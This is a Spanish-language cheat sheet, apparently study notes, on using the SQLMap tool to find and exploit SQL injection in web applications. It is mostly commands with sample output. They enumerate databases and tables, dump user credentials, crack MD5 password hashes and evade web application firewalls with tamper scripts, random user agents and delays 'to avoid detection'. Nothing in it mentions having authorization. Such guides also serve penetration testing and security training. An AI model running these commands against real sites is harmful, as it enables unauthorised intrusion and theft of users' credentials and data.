## ¿Qué es SQLMap?

Herramienta automática para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web.

**¿Para qué sirve?**

- Detectar si un sitio web tiene SQL injection
- Extraer datos de bases de datos (usuarios, contraseñas, etc.)
- Obtener acceso al servidor en algunos casos
- Identificar el tipo de base de datos (MySQL, PostgreSQL, etc.)

https://youtu.be/pF7uz_ptuFc?si=uJQqGh3xz4gm-I4m
---

## Sintaxis Básica

bash

```bash
sqlmap -u "URL" [opciones]
```

---

## Argumentos Esenciales

### Target (Objetivo)

**`-u <URL>`** - URL a testear

bash

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

**¿Para qué?** Especificar la página vulnerable

**`-r <archivo>`** - Usar request HTTP desde archivo

bash

```bash
sqlmap -r request.txt
```

**¿Para qué?** Cuando tienes un request complejo guardado de Burp Suite **Cómo obtenerlo:** Burp Suite → click derecho en request → "Copy to file"

**`--data="datos"`** - Datos POST

bash

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"
```

**¿Para qué?** Para formularios que usan POST en lugar de GET

**`-p <parámetro>`** - Testear parámetro específico

bash

```bash
sqlmap -u "http://example.com/page.php?id=1&name=test" -p id
```

**¿Para qué?** Cuando solo quieres probar un parámetro específico (más rápido)

### Autenticación y Cookies

**`--cookie="cookie"`** - Especificar cookie

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abcd1234"
```

**¿Para qué?** Sitios que requieren estar "logueado" para acceder a ciertas páginas **Cómo obtenerla:** DevTools (F12) → Application → Cookies → copiar valor

**`--headers="header"`** - Headers personalizados

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --headers="User-Agent: Mozilla/5.0"
```

**`--auth-type=BASIC`** - HTTP Basic Auth

bash

```bash
sqlmap -u "http://example.com/admin/" --auth-type=BASIC --auth-cred="admin:password"
```

**¿Para qué?** Cuando el sitio pide usuario y contraseña en una ventana emergente

### Detección y Testing

**`--dbs`** - Listar todas las bases de datos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

**¿Para qué?** Ver qué bases de datos existen en el servidor

**`-D <database>`** - Especificar base de datos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D nombre_db --tables
```

**¿Para qué?** Trabajar con una base de datos específica

**`--tables`** - Listar tablas

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D nombre_db --tables
```

**¿Para qué?** Ver qué tablas tiene la base de datos (usuarios, productos, etc.)

**`-T <tabla>`** - Especificar tabla

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D nombre_db -T users --columns
```

**`--columns`** - Listar columnas

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D nombre_db -T users --columns
```

**¿Para qué?** Ver qué campos tiene la tabla (username, password, email, etc.)

**`-C <columnas>`** - Especificar columnas

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D nombre_db -T users -C username,password --dump
```

**`--dump`** - Extraer datos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D nombre_db -T users --dump
```

**¿Para qué?** Descargar todo el contenido de una tabla (los datos reales)

**`--dump-all`** - Extraer TODAS las bases de datos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --dump-all
```

**⚠️ Puede tardar MUCHO tiempo**

### Niveles de Testing

**`--level=<1-5>`** - Nivel de pruebas

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --level=5
```

**¿Qué hace cada nivel?**

- `1` (default): Pruebas básicas, solo GET/POST
- `2`: Incluye HTTP Cookie header
- `3`: Incluye User-Agent y Referer
- `4-5`: Pruebas más exhaustivas

**¿Cuál usar?** Empieza con 1, si no encuentra nada sube a 3

**`--risk=<1-3>`** - Nivel de riesgo

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --risk=3
```

**¿Qué hace cada nivel?**

- `1` (default): Pruebas seguras
- `2`: Pruebas que podrían modificar datos
- `3`: Pruebas que pueden ser destructivas (UPDATE/DELETE)

**⚠️ CUIDADO:** `--risk=3` puede dañar la base de datos

### Técnicas de Inyección

**`--technique=<técnica>`** - Especificar técnicas

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUST
```

**Técnicas disponibles:**

- `B`: Boolean-based blind (¿página responde diferente si es true/false?)
- `E`: Error-based (errores SQL en la respuesta)
- `U`: Union query-based (UNION SELECT para extraer datos)
- `S`: Stacked queries (múltiples queries separadas por ;)
- `T`: Time-based blind (el servidor tarda más en responder)

**¿Cuál usar?** Deja que SQLMap elija automáticamente (no uses este argumento)

### Optimización

**`--batch`** - Modo no interactivo

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```

**¿Para qué?** SQLMap responde automáticamente "sí" a todas las preguntas **Útil para:** Scripts automáticos o cuando no quieres estar respondiendo preguntas

**`--threads=<número>`** - Hilos paralelos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --threads=10
```

**¿Para qué?** Ir más rápido (default: 1) **Recomendado:** 5-10 threads

**`--fresh-queries`** - No usar caché

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --fresh-queries
```

**¿Para qué?** SQLMap guarda resultados, esto lo fuerza a volver a testear todo

**`--flush-session`** - Limpiar sesión guardada

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --flush-session
```

**¿Para qué?** Borrar todos los datos guardados de tests anteriores (empezar de cero)

### Output

**`-v <0-6>`** - Verbosidad

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -v 3
```

- `0`: Solo resultados finales
- `1`: Info básica (default)
- `3`: Payloads usados
- `6`: TODO (debug completo)

**`--output-dir=<directorio>`** - Guardar output

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --output-dir=/tmp/sqlmap
```

### Evasión de WAF

**`--random-agent`** - User-Agent aleatorio

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --random-agent
```

**¿Para qué?** Evitar que te detecten por usar siempre el mismo User-Agent

**`--tamper=<script>`** - Scripts de evasión

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment
```

**Scripts útiles:**

- `space2comment`: Reemplaza espacios con `/**/`
- `between`: Reemplaza `>` con `BETWEEN`
- `charencode`: Codifica caracteres
- `apostrophemask`: Reemplaza `'` con `%EF%BC%87`

**Usar múltiples:**

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,between
```

**`--delay=<segundos>`** - Delay entre requests

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --delay=2
```

**¿Para qué?** Ir más lento para evitar detección (no sobrecargar servidor)

---

## Workflow Típico (Paso a Paso)

### Paso 1: Detectar Vulnerabilidad

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```

**¿Qué hace?** Verifica si el parámetro `id` es vulnerable a SQL injection

**Resultado esperado:**

```
[INFO] testing 'MySQL >= 5.0 AND error-based'
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
```

### Paso 2: Identificar Base de Datos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --current-db
```

**¿Qué hace?** Muestra el nombre de la base de datos actual

### Paso 3: Listar Todas las Bases de Datos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

**Resultado:**

```
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db
```

### Paso 4: Listar Tablas de una BD

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D webapp_db --tables
```

**Resultado:**

```
Database: webapp_db
[4 tables]
+----------+
| users    |
| products |
| orders   |
| admin    |
+----------+
```

### Paso 5: Listar Columnas de una Tabla

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D webapp_db -T users --columns
```

**Resultado:**

```
Database: webapp_db
Table: users
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| username | varchar(50) |
| password | varchar(50) |
| email    | varchar(100)|
+----------+-------------+
```

### Paso 6: Extraer Datos

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D webapp_db -T users -C username,password --dump
```

**Resultado:**

```
Database: webapp_db
Table: users
[3 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| user1    | 098f6bcd4621d373cade4e832627b4f6 |
| john     | 482c811da5d5b4bc6d497ffa98491e38 |
+----------+----------------------------------+
```

**¿Los hashes son MD5?** Prueba crackearlos:

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D webapp_db -T users --dump --crack
```

SQLMap intentará crackear los hashes automáticamente

---

## Ejemplos Prácticos

### Sitio con GET

bash

```bash
# Detectar vulnerabilidad
sqlmap -u "http://example.com/product.php?id=5" --batch

# Si es vulnerable, extraer usuarios
sqlmap -u "http://example.com/product.php?id=5" --dbs
sqlmap -u "http://example.com/product.php?id=5" -D shop -T users --dump
```

### Sitio con POST (Formulario de Login)

bash

```bash
# Capturar request con Burp Suite o usar --data
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --batch

# Si vulnerable, obtener credenciales
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" -D webapp -T admin --dump
```

### Sitio con Cookie de Sesión

bash

```bash
# Primero loguéate manualmente y copia tu cookie
# DevTools → Application → Cookies → PHPSESSID

sqlmap -u "http://example.com/profile.php?id=1" --cookie="PHPSESSID=abc123def456" --dbs
```

### Sitio con WAF/Protección

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" --random-agent --delay=2 --tamper=space2comment --batch
```

### Request Completo desde Burp Suite

**1. Capturar request en Burp:**

- Interceptar request
- Click derecho → "Copy to file" → guardar como `request.txt`

**2. Usar con SQLMap:**

bash

```bash
sqlmap -r request.txt --batch --dbs
```

### Extraer Solo Columnas Importantes

bash

```bash
sqlmap -u "http://example.com/page.php?id=1" -D webapp -T users -C username,password,email --dump
```

**¿Para qué?** No desperdiciar tiempo extrayendo columnas que no te interesan

### Buscar Admin

bash

```bash
# Primero ver tablas
sqlmap -u "http://example.com/page.php?id=1" -D webapp --tables

# Buscar tabla que parezca de admin
sqlmap -u "http://example.com/page.php?id=1" -D webapp -T admin --dump
```